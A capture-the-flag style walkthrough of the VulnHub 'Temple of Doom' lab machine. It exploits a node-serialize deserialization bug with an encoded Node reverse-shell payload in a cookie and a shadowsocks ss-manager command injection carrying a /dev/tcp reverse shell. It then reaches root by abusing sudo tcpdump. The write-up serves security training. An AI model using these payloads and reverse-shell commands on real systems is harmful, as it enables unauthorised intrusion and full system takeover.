excerpt: "Temple of Doom was an Easy/Intermediate box. It included a NodeJs deserialization
attack, something I hadn't encountered before and was really interesting. Privilege Escalation involved
carefully enumerating the running services."

* ### Setup

  Download the virtual machine <a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/">here</a> and import it in either VirtualBox or VMWare.
  * **Addresses** - This will be important to understand the writeup.
    * My Kali machine: **10.0.2.15**
    * Temple of Doom machine: **10.0.2.14**
  

  
### Information Gathering
---

* Running **nmap** with `nmap -sC -sV -p- -A -oA templeofdoom 10.0.2.14` reveals **two** ports.

  ![](/assets/images/templeofdoom/1.jpg)

1. **SSH** on default port **22** .
2. A <a href="https://en.wikipedia.org/wiki/Node.js">NodeJs</a> server running at port **666**.

Let's check the server at port **666**, while also setting **gobuster** and **nikto** running in the background.

 ![](/assets/images/templeofdoom/2.jpg)

We see an under construction message. After fuzzing the url a little bit and reloading the page a few times, the application errors out with 

  ![](/assets/images/templeofdoom/3.jpg)

This error tells us that something went wrong with the serialization process and we also notice the module doing the serialization is **node-serialize**.

* Unfortunately, this module contains a serious **deserialization vulnerability**, allowing **remote code execution**. There is a great analysis of such attacks in nodejs in this pdf https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

### Vulnerability Analysis
---
* First we need to understand what a **deserialization vulnerablity** is. From <a href="https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/">this article</a> by http://acunetix.com, 
> **_Insecure Deserialization_** is a vulnerability which occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS) attack, or even execute arbitrary code upon it being deserialized. It also occupies the **#8 spot in the OWASP Top 10 2017 list.**
Serialization refers to a process of converting an object into a format which can be persisted to disk (for example saved to a file or a datastore), sent through streams (for example stdout), or sent over a network. JSON and XML are two of the most commonly used serialization formats within web applications.
Deserialization on the other hand, is the opposite of serialization, that is, transforming serialized data coming from a file, stream or network socket into an object.
Web applications make use of serialization and deserialization on a regular basis and most programming languages even provide native features to serialize data. **It’s important to understand that safe deserialization of objects is normal practice in software development. The trouble however, starts when deserializing untrusted user input.**

Based on the paper mentioned in the Information gathering section, we will **create a test environment to confirm the vulnerablitiy.**

**1.** First install **npm** with `apt install npm`, then the vulnerable **node-serialize** module with `npm install node-serialize`.  
  Note: npm will now warn you the node-serialize was found to contain a serious vulnerability.
  
**2.** Let's create a test object and then pass it to the **serialize** function.
  ```javascript
  var obj = {
rce : function(){
require('child_process').exec('id /', function(error,
stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(obj));
```
Saving the above code into a file called serialized.js and executing with `node serialized.js` outputs the serialized object
```javascript
{"rce":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('id', function(error,\nstdout, stderr) { console.log(stdout) });\n}"}
```
**3.** The main problem now is that even if this object is **unserialized**, nothing will execute unless the function with tag **"rce"** is called. Thankfully for us, Javascript contains a feature called **_Immediately invoked
function expression (IIFE)_** for calling the function. If we use IIFE bracket
() after the function body, the function **will get invoked when the object is
created.**
As such, our **new payload** is
```javascript
{"rce":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('id', function(error,\nstdout, stderr) { console.log(stdout) });\n}()"}
```
**Note the parentheses in the end.**

**4.** Create another script called **unserialize.js**, emulating the server behaviour with
```javascript
var serialize = require('node-serialize');
var payload = {"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'id \',function(error, stdout, stderr) { console.log(stdout)});}()"};
serialize.unserialize(payload);
```
and run it.

  ![](/assets/images/templeofdoom/4.jpg)

**We can clearly see our code got executed!**

**5.** For further testing, there is a very handy tool called <a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">nodejsshell.py</a>, that will help us create a **reverse shell** which will run in **node**.
For local testing purposes, run it with `python nodejsshell.py 127.0.0.1 1337` to create a payload that will send back a shell at localhost on port 1337. This is the outputted code:
```javascript
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

We must put this in our final payload called localtest.js
```javascript
var serialize = require('node-serialize');
var payload = {"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"};
serialize.unserialize(payload);
```
and run locally, while also listening on port **1337**.

  ![](/assets/images/templeofdoom/5.jpg)

**We have a shell!**. Now we have to do the same on the remote machine.

* Let's refresh the site and capture the request in **Burp Suite**.

  ![](/assets/images/templeofdoom/6.jpg)

We notice a cookie named **_profile_**, and it's value looks base64 encoded. Using burp we can **first** url-decode and **then** base64-decode the cookie resulting in:

  ![](/assets/images/templeofdoom/7.jpg)

We can see the cookie is actually the **object**
```javascript
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}
```

**Bonus:** Notice that the last value is not properly formatted and needs an extra `"`. Fix the object syntax, base64 encode it, then url-encode and include it in the request. You will be greeted with:

  ![](/assets/images/templeofdoom/8.jpg)

This doesn't help us in anyway.

## Exploitation
---

* Using **nodejsshell.py**, we create a reverse shell payload with `python nodejsshell.py 10.0.2.15 1337`. Copy the resulting code and put it in an object like we saw earlier in the local tests.

```
* Now we will base-64 encode it and copy it to our clipboard using xclip. 
  ``` cat exploit.js | base64 | xclip -selection clipboard```

* Paste in burp and send the request, while having already set up a listening session with `nc -lvnp 1337`.

* We get a shell! Now we make it more interactive with `python -c "import pty; pty.spawn('/bin/bash')"` and stop our input from being echoed back at us by `Ctr-Z` to pause the process, `stty raw -echo` and  `fg` to bring back the shell. We can see we are logged in as user **nodeadmin**.

## Privilege Escalation
---
**nodeadmin** user has very little privileges in this box.
Trying `ls` in the `/home` directory reveals another user called **fireman**.

* We will use a well-known linux enumeration script called <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a>.

  * `wget` the script on your **Kali** machine and save it int `/var/www/html`.
  *  Run `python -m SimpleHTTPServer 80` to run a python web server, with the current directory as web root.
  *  `wget` the script on the remote machine in `/tmp` folder with `wget http://10.0.2.15/LinEnum.sh`, `chmod +x` on it.
  * **Run it.**

* In the running processes window we notice something interesting

  ![](/assets/images/templeofdoom/10.jpg)

A process called **ss-manager** is running as user **fireman**.

* Searching in google reveals <a href="https://www.cvedetails.com/cve/CVE-2017-15924/">CVE-2017-15924</a> and <a href="https://www.exploit-db.com/exploits/43006">exploit-db.com/exploits/43006</a>.
>In manager.c in ss-manager in shadowsocks-libev 3.1.0, improper parsing allows command injection via shell metacharacters in a JSON configuration request received via 127.0.0.1 UDP traffic, related to the add_server, build_config, and construct_command_line functions.

>The configuration file on the file system or the JSON configuration received via UDP request is parsed and the arguments are passed to the "add_server" function. The function calls "construct_command_line(manager, server);" which returns a string from the parsed configuration. The string gets executed at line 486 "if (system(cmd) == -1) {", so if a configuration parameter contains "||evil command&&" within the "method" parameter, the evil command will get executed.

* **ss-manager** listens on port **8839** by default and you can confirm it by running `netstat -altupn`.
* Let's test the exploit by creating a file called **_jsonexploit_** in our machine and writing the following inside
  ```json
  add: {"server_port":8003, "password":"test", "method":"||bash -i >& /dev/tcp/10.0.2.15/1337 0>&1||"}
  ```
which will return a reverse shell to us on port **1337**.
* Get the **jsonexploit** file on the vulnerable machine, using the same method we moved the **LinEnum** script.
* Start a listening session on kali with `nc -lvnp 1337` and execute `nc 127.0.0.1 8839 <jsonexploit` on the **templeofdoom** machine.

  ![](/assets/images/templeofdoom/firemanlogin.jpg)

* ### We see that we have succesfully logged in as user **fireman**.

* Let's check what **fireman** can run as **root** with `sudo -l`

  ![](/assets/images/templeofdoom/sudol.jpg)

* Referring to <a href="https://gtfobins.github.io/">GTFObins</a>, we see that we can use **tcpdump** to our advantage and execute commands as **root!**.

* Create a script called **rootshell.sh** in `/tmp/` in current shell, put `bash -i >& /dev/tcp/10.0.2.15/4444 0>&1` inside it, `chmod +x /tmp/rootshell.sh` it and start a listening session on port **4444** on your Kali machine.

* Now run `sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/rootshell.sh -Z root` as user **fireman**.
* Checking our session on port **4444**, reveals we have succesfully gained a **root shell!**.
